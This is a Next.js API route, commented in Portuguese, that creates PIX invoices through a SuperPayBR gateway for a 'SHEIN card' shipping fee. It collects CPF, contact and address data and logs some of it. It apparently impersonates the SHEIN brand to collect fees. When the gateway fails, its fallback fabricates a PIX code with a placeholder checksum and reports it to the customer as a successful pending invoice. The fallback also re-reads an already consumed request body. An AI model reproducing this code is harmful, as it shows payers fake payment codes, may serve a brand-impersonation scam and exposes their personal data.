import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA SUPERPAYBR ===")

    const body = await request.json()
    const { amount, shipping, method } = body

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("📋 Dados da fatura SuperPayBR:", {
      amount,
      shipping,
      method,
      cliente: cpfData.nome,
      email: userEmail,
    })

    // Verificar variáveis de ambiente
    if (!process.env.SUPERPAYBR_TOKEN || !process.env.SUPERPAYBR_SECRET_KEY) {
      console.log("❌ Variáveis de ambiente SuperPayBR não configuradas")
      throw new Error("Configuração SuperPayBR incompleta")
    }

    // Gerar external_id único (IDÊNTICO AO SISTEMA TRYPLOPAY)
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    console.log("🆔 External ID gerado:", externalId)

    // Preparar dados da fatura SuperPayBR conforme documentação
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          district: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01000000",
          country: "BR",
        },
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        id: externalId, // USAR EXTERNAL_ID COMO ID
        type: "3", // PIX
        due_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0], // 2 horas
        referer: `SHEIN_FRETE_${method}`,
        installment: "1",
        order_url: `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "1",
            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
            title: `Frete ${method} - Cartão SHEIN`,
            qnt: "1",
            discount: 0,
            amount: Number.parseFloat(amount),
          },
        ],
      },
      shipping: {
        amount: 0.0,
      },
    }

    console.log("🚀 Enviando para SuperPayBR API...")
    console.log("📤 URL:", process.env.SUPERPAYBR_API_URL || "https://api.superpaybr.com")

    // Fazer requisição para SuperPayBR
    const createResponse = await fetch(
      `${process.env.SUPERPAYBR_API_URL || "https://api.superpaybr.com"}/v4/invoices`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${process.env.SUPERPAYBR_TOKEN}`,
          Accept: "application/json",
          "User-Agent": "SHEIN-Card/1.0",
        },
        body: JSON.stringify(invoiceData),
      },
    )

    console.log("📥 Resposta SuperPayBR:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
      headers: Object.fromEntries(createResponse.headers.entries()),
    })

    // Obter resposta como texto primeiro para debug
    const responseText = await createResponse.text()
    console.log("📄 Resposta raw SuperPayBR:", responseText.substring(0, 500))

    let invoiceResult: any = null

    // Tentar fazer parse do JSON
    try {
      if (responseText.trim()) {
        invoiceResult = JSON.parse(responseText)
        console.log("✅ JSON SuperPayBR parseado com sucesso!")
      } else {
        throw new Error("Resposta vazia da SuperPayBR")
      }
    } catch (parseError) {
      console.log("❌ Erro ao fazer parse do JSON SuperPayBR:", parseError)
      throw new Error(`Resposta inválida da SuperPayBR: ${responseText.substring(0, 200)}`)
    }

    if (createResponse.ok && invoiceResult) {
      console.log("✅ Fatura SuperPayBR criada com sucesso!")

      // Extrair dados do PIX da resposta SuperPayBR
      const pixPayload = invoiceResult.fatura?.pix?.payload || invoiceResult.pix?.payload || ""
      const qrCodeUrl = invoiceResult.fatura?.pix?.image || invoiceResult.pix?.qr_code || ""

      // Gerar QR Code usando QuickChart como fallback
      const finalQrCode =
        qrCodeUrl ||
        (pixPayload
          ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=200`
          : "/placeholder.svg?height=200&width=200")

      // Mapear resposta para formato esperado (IDÊNTICO AO SISTEMA TRYPLOPAY)
      const mappedInvoice = {
        id: invoiceResult.fatura?.id || externalId,
        invoice_id: invoiceResult.fatura?.invoice_id || externalId,
        external_id: externalId, // GARANTIR QUE EXTERNAL_ID SEJA RETORNADO
        pix: {
          payload: pixPayload,
          image: finalQrCode,
          qr_code: finalQrCode,
        },
        status: {
          code: invoiceResult.fatura?.status?.code || 1,
          title: invoiceResult.fatura?.status?.title || "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: invoiceResult.fatura?.valores?.bruto || Math.round(Number.parseFloat(amount) * 100),
          liquido: invoiceResult.fatura?.valores?.liquido || Math.round(Number.parseFloat(amount) * 100),
        },
        vencimento: {
          dia:
            invoiceResult.fatura?.vencimento?.dia ||
            new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real",
      }

      console.log("🎯 Fatura SuperPayBR mapeada:", {
        external_id: mappedInvoice.external_id,
        invoice_id: mappedInvoice.invoice_id,
        amount: mappedInvoice.valores.bruto / 100,
        qr_code_length: mappedInvoice.pix.qr_code.length,
      })

      return NextResponse.json({
        success: true,
        data: mappedInvoice,
        raw_response: invoiceResult,
      })
    } else {
      // Erro da API SuperPayBR - criar fatura de emergência
      console.log("❌ Erro da SuperPayBR API:", createResponse.status, responseText)
      throw new Error(`SuperPayBR API Error: ${createResponse.status} - ${responseText}`)
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura SuperPayBR:", error)

    // Criar fatura de emergência (IDÊNTICO AO SISTEMA TRYPLOPAY)
    try {
      const body = await request.json()
      const { amount } = body
      const externalId = `SHEIN_EMG_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

      console.log("🚨 Criando fatura de emergência SuperPayBR:", externalId)

      const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.superpaybr.com/qr/v2/${externalId}520400005303986540${Number.parseFloat(amount).toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`

      const emergencyInvoice = {
        id: externalId,
        invoice_id: externalId,
        external_id: externalId,
        pix: {
          payload: emergencyPix,
          image: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
          qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=200`,
        },
        status: {
          code: 1,
          title: "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(Number.parseFloat(amount) * 100),
          liquido: Math.round(Number.parseFloat(amount) * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "emergency",
      }

      console.log("✅ Fatura de emergência SuperPayBR criada:", {
        external_id: emergencyInvoice.external_id,
        amount: emergencyInvoice.valores.bruto / 100,
      })

      return NextResponse.json({
        success: true,
        data: emergencyInvoice,
        fallback: true,
        message: "Fatura criada em modo de emergência devido a erro na API SuperPayBR",
        error: error instanceof Error ? error.message : "Erro desconhecido",
      })
    } catch (emergencyError) {
      console.log("❌ Erro ao criar fatura de emergência SuperPayBR:", emergencyError)
      return NextResponse.json(
        {
          success: false,
          error: "Erro crítico: não foi possível criar fatura SuperPayBR",
          details: error instanceof Error ? error.message : "Erro desconhecido",
        },
        { status: 500 },
      )
    }
  }
}
